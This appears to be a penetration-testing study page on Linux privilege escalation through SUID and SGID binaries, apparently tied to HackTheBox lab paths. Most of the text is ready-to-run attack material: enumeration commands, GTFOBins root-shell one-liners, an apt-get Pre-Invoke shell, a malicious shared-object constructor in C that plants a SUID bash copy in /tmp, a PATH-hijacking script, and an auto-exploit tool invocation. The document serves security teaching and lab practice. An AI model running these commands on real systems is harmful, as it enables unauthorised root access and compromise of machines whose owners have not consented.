## SUID and SGID Special Permissions

The SUID bit causes a binary to execute with the file owner's privileges rather than the executing user's privileges. When the owner is root, any user who runs the binary gains root-level access for that execution.  The SGID bit works the same way but at the group level. These are legitimate features, used by binaries like `passwd` (which needs root access to modify `/etc/shadow`), but any non-standard or misconfigured SUID binary is a potential escalation path. 

***

## Enumeration

```bash
# All SUID binaries owned by root
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# All SGID binaries
find / -user root -perm -6000 -type f 2>/dev/null

# Both SUID and SGID in one pass
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null
```

The `s` in the execute position of the user field indicates SUID (`-rwsr-xr-x`). A capital `S` instead of `s` means the SUID bit is set but the execute bit is not, making the binary non-functional in that configuration. 

***

## Attack Vector 1: GTFOBins SUID Abuse

For every SUID binary found, look it up at [gtfobins.github.io](https://gtfobins.github.io) under the SUID filter. Many standard binaries that legitimately carry the SUID bit have documented escalation paths. 

### Common Examples

```bash
# env (if SUID)
/usr/bin/env /bin/sh -p

# find (if SUID)
find . -exec /bin/sh -p \; -quit

# python (if SUID)
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# vim (if SUID)
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# bash (if SUID)
bash -p

# cp (if SUID) - copy SUID bit from one binary to another
cp --no-preserve=all /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p
```

The `-p` flag in bash and sh starts the shell in privileged mode, preserving the effective UID rather than dropping it back to the real UID. Without `-p`, bash will detect the EUID/UID mismatch and drop privileges. 

### apt-get SUID / sudo Example

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
# uid=0(root) gid=0(root) groups=0(root)
```

The `Pre-Invoke` option causes `apt-get` to run an arbitrary command before the update proceeds, inheriting the elevated privileges of the process.

***

## Attack Vector 2: Shared Object Injection

When a SUID binary loads a shared library (`.so` file) from a path you can write to, you can replace or create that library with a malicious version that executes code as root. This is the Linux equivalent of DLL hijacking on Windows. 

### Step 1: Find What Libraries the Binary Loads

```bash
# Check for missing or writable shared objects
strace /home/htb-student/shared_obj_hijack/payroll 2>&1 | grep -iE "open|access|no such file"

# Alternatively use ldd
ldd /home/htb-student/shared_obj_hijack/payroll
```

Look for lines like:

```
open("/home/htb-student/.config/libcalc.so", ...) = -1 ENOENT (No such file or directory)
```

A missing `.so` file being loaded from a directory you own means you can create it. 

### Step 2: Write the Malicious Shared Object

```c
// libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
}
```

### Step 3: Compile and Place It

```bash
gcc -shared -fPIC -o /home/htb-student/.config/libcalc.so libcalc.c
```

### Step 4: Execute the SUID Binary

```bash
/home/htb-student/shared_obj_hijack/payroll
/tmp/rootbash -p
# rootbash-5.0# id
# uid=1000(htb-student) euid=0(root)
```

The SUID binary loads your `.so` at runtime, the constructor function runs as root, and a SUID-enabled copy of bash is dropped in `/tmp`. 

***

## Attack Vector 3: PATH Hijacking via SUID Binary

If a SUID binary calls a command without an absolute path, combining it with PATH manipulation gives you code execution as root (covered in detail in the PATH Abuse section):

```bash
# Find what commands the SUID binary calls without full paths
strings /path/to/suid-binary | grep -v "/"

# If it calls 'service' without a full path:
echo '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/path/to/suid-binary
```

***

## SUID vs SGID

| Feature | SUID | SGID |
|---|---|---|
| Bit value | `4` (e.g. `chmod 4755`) | `2` (e.g. `chmod 2755`) |
| Permission indicator | `s` in user execute field | `s` in group execute field |
| Runs as | File owner (usually root) | File group |
| Find command | `find / -perm -4000` | `find / -perm -2000` |
| Common legitimate use | `passwd`, `sudo`, `ping` | `write`, `wall`, `crontab` |

SGID on a directory means new files created inside inherit the directory's group, not the creator's group. This is less commonly abused but worth noting if a group has write access to a sensitive directory. 

***

## Automated Tool: SUID3NUM

[SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM) specifically enumerates SUID binaries and cross-references them against GTFOBins, providing ready-to-run escalation commands automatically. 

```bash
wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py
python3 suid3num.py
# Flags matching GTFOBins entries in red
# Provides the exact command to run for each

# With auto-exploit flag
python3 suid3num.py -e
```

Any binary in the SUID output that also appears on GTFOBins is an immediate priority. Non-standard or custom SUID binaries not on GTFOBins should be investigated with `strings` and `strace` for shared object loading issues or relative path calls.
